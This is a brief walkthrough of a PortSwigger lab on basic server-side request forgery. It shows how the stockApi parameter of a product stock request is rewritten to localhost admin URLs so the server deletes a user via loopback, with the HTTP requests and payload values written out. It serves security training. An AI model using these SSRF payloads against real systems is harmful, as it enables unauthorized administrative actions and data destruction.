# [Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)

> tricking the server into making loopback requests

- intercept the a product stock request

```
POST /product/stock HTTP/2
...
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

- the request makes another "internal" request
- it can be abused with a loopback requests
- change the `stockApi` to

```
stockApi=http://localhost/admin
```

- forward the request
- it will return the the product page and the option to delete users
- click the `delete carlos`, it will send a request:

```
GET /admin/delete?username=carlos HTTP/2
...
```

- but the response: `Admin interface only available if logged in as an administrator, or if requested from loopback`

> request the profile delete on loopback

- send the last `/product/stock` request to the repeater
- change the `stockApi` again

```
stockApi=http://localhost/admin/delete?username=carlos
```

- send it
